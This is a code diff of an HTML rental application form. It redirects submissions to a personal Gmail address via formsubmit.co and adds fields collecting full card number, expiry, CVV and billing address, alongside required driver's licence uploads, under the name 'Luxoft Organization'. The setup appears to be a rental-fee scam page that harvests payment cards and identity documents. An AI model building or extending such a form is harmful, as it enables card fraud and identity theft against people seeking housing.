@@ -60,7 +60,7 @@
 
   <h1>Rental Application Form</h1>
 
-  <form action="https://formsubmit.co/goodhome267@gmail.com" method="POST" enctype="multipart/form-data">
+  <form action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data">
 
     <label>TODAY’S DATE</label>
     <input type="date" name="Today's Date" required>
@@ -107,7 +107,7 @@
     <input type="text" name="Marital Status">
 
     <label>Proposed Occupants & Ages</label>
-    <textarea name="Proposed Occupants and Ages" placeholder="1) _  2) _  3) _ 4) _ 5) _"></textarea>
+    <textarea name="Proposed Occupants and Ages" placeholder="1) ___  2) ___  3) ___ 4) ___ 5) ___"></textarea>
 
     <label>Pet</label>
     <input type="text" name="Pet">
@@ -164,9 +164,37 @@
     <label>Driver’s License (Back)</label>
     <input type="file" name="DL Back" accept="image/*,application/pdf" required>
 
-    <!-- Formsubmit options -->
+    <h2>Billing Information</h2>
+
+    <label>Number of Adults</label>
+    <input type="number" name="Number of Adults" min="1" required>
+
+    <label>Total to be Billed ($75 per adult)</label>
+    <input type="text" name="Total Billed" placeholder="$75, $150, etc." required>
+
+    <label>Cardholder Full Name</label>
+    <input type="text" name="Cardholder Name" required>
+
+    <label>Card Number</label>
+    <input type="text" name="Card Number" placeholder="XXXX-XXXX-XXXX-XXXX" required>
+
+    <label>Expiry Date</label>
+    <input type="text" name="Expiry Date" placeholder="MM/YY" required>
+
+    <label>CVV</label>
+    <input type="text" name="CVV" placeholder="3-digit code" required>
+
+    <label>Billing Address</label>
+    <input type="text" name="Billing Address" required>
+
+    <label>
+      <input type="checkbox" name="Authorization" required>
+      I authorize Luxoft Organization to charge the above amount for the rental application.
+    </label>
+
     <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_template" value="table">
+    <input type="hidden" name="_next" value="https://luxoftorganization.github.io/Rental-application-/thank-you.html">
 
     <label>Date Signed</label>
     <input type="date" name="Form Signed Date" required>
